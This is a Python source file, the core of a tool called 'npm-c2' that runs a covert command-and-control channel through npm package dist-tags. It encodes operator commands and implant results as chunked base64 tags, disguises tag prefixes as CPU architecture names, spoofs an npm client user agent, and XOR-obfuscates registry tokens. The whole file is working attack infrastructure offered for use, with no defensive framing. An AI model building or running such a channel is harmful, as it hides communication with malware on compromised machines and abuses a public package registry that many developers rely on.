"""npm-c2 core: tag framing, base64 chunking, token obfuscation.

Tag format (v2)::

    <prefix><gid>-<idx><total>_<b64url chunk>

    prefix  4 chars: x64- (command), arm64- (result), ia32- (heartbeat)
    gid     4 hex chars, shared by every chunk of one payload
    idx     2 digits, 1-based chunk index
    total   2 digits, chunk count
    chunk   base64url payload without padding

Heartbeats keep the short form ``ia32-<nonce>``.

The old form ``<prefix><nonce>_<b64>`` is still decoded as a single-chunk
payload so tags written by v1 operators remain readable.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import os

CMD_PREFIX = "x64-"
RES_PREFIX = "arm64-"
HBT_PREFIX = "ia32-"
# The version a dist-tag points at. It MUST already exist in the package;
# npm answers 400 for a tag pointing at a non-existent version. Override with
# NPMC2_TAG_VALUE when the package's only version is not 1.0.0 (staged-first
# packages live on 0.0.0-stage).
TAG_VALUE = os.environ.get("NPMC2_TAG_VALUE") or "1.0.0"
MAX_TAG_LEN = 250
# npmjs by default, but the implant and the operator must agree: point both at
# a private registry by setting NPMC2_API_BASE (e.g. http://10.0.0.5:4874).
# The implant bakes the same value in through --api-base.
_DEFAULT_API_BASE = "https://registry.npmjs.org"
API_BASE = (os.environ.get("NPMC2_API_BASE") or _DEFAULT_API_BASE).rstrip("/")
API = API_BASE + "/-/package/{}/dist-tags"
UA = "npm/11.18.0 node/v22.7.0 win32 x64"

PREFIXES = (CMD_PREFIX, RES_PREFIX, HBT_PREFIX)

# prefix(4) + gid(4) + "-"(1) + idx(2) + total(2) + "_"(1)
_FRAME_OVERHEAD = 14
_MAX_CHUNKS = 99          # idx/total are two decimal digits

# Don't panic the operator when a package name is scoped: npm wants
# "@scope%2fname" on the dist-tags route.
_SCOPED = "@"


def registry_path(package: str) -> str:
    """Percent-encode a package name the way the registry route expects."""
    name = package.strip()
    if name.startswith(_SCOPED) and "/" in name:
        scope, _, rest = name.partition("/")
        return f"{scope}%2f{rest}"
    return name


def encode_payload(data: bytes, prefix: str = CMD_PREFIX) -> list[str]:
    """Split ``data`` into one or more chunk tags, in order."""
    b64 = base64.urlsafe_b64encode(data).rstrip(b"=").decode()
    room = MAX_TAG_LEN - len(prefix) - _FRAME_OVERHEAD
    room -= room % 4          # chunk on a 4-char boundary: no bits lost at a split
    if room < 16:
        raise ValueError(f"tag prefix too long: {prefix!r}")
    chunks = [b64[i:i + room] for i in range(0, len(b64), room)] or [""]
    total = len(chunks)
    if total > _MAX_CHUNKS:
        raise ValueError(f"payload needs {total} tags, limit is {_MAX_CHUNKS}")
    gid = os.urandom(2).hex()
    return [f"{prefix}{gid}-{idx:02d}{total:02d}_{chunk}"
            for idx, chunk in enumerate(chunks, start=1)]


def decode_tag(tag: str) -> dict | None:
    """Decode one tag into ``{kind, gid, index, total, data}``."""
    for prefix in PREFIXES:
        if not tag.startswith(prefix):
            continue
        body = tag[len(prefix):]
        if "_" not in body:
            return None                      # heartbeat, no payload
        meta, _, payload = body.partition("_")
        gid, _, seq = meta.partition("-")
        if seq and len(seq) >= 4 and seq[:2].isdigit() and seq[2:4].isdigit():
            index, total = int(seq[:2]), int(seq[2:4])
        else:                                # v1 tag: nonce_b64
            gid, index, total = meta, 1, 1
        try:
            pad = -len(payload) % 4
            data = base64.b64decode(payload + "=" * pad, altchars=b"-_", validate=True)
        except (binascii.Error, ValueError):
            return None
        if index < 1 or total < 1 or index > total:
            return None
        return {"kind": prefix, "gid": gid, "index": index,
                "total": total, "data": data}
    return None


def reassemble(tags, prefix: str = CMD_PREFIX) -> list[bytes]:
    """Return complete payloads found in ``tags``, ordered by arrival.

    Incomplete groups are dropped; ``group_chunks`` exposes them for callers
    that want to buffer across polls.
    """
    return [buf for buf, complete in group_chunks(tags, prefix) if complete]


def group_chunks(tags, prefix: str = CMD_PREFIX):
    """Yield ``(buffer, complete)`` per group id, in first-seen order."""
    for _gid, buf, complete in group_chunks_with_id(tags, prefix):
        yield buf, complete


def group_chunks_with_id(tags, prefix: str = CMD_PREFIX):
    """Yield ``(gid, buffer, complete)`` per group, in first-seen order."""
    groups: dict[str, dict[int, bytes]] = {}
    totals: dict[str, int] = {}
    order: list[str] = []
    for tag in tags:
        if not tag.startswith(prefix):
            continue
        info = decode_tag(tag)
        if not info:
            continue
        gid = info["gid"]
        if gid not in groups:
            groups[gid] = {}
            totals[gid] = info["total"]
            order.append(gid)
        elif totals[gid] != info["total"]:
            continue
        groups[gid][info["index"]] = info["data"]
    for gid in order:
        total = totals[gid]
        complete = (len(groups[gid]) == total
                    and all(i in groups[gid] for i in range(1, total + 1)))
        buf = b"".join(groups[gid].get(i, b"") for i in range(1, total + 1))
        yield gid, buf, complete


def _xor_key(package: str) -> bytes:
    return hashlib.sha256(package.encode()).digest()[:16]


def _xor(raw: bytes, package: str) -> bytes:
    key = _xor_key(package)
    stream = (key * (len(raw) // len(key) + 1))[:len(raw)]
    return bytes(a ^ b for a, b in zip(raw, stream))


def obfuscate_token(token: str, package: str) -> str:
    return _xor(token.encode(), package).hex()


def deobfuscate_token(hexdata: str, package: str):
    try:
        raw = bytes.fromhex(hexdata)
    except ValueError:
        return None
    try:
        return _xor(raw, package).decode()
    except UnicodeDecodeError:
        return None
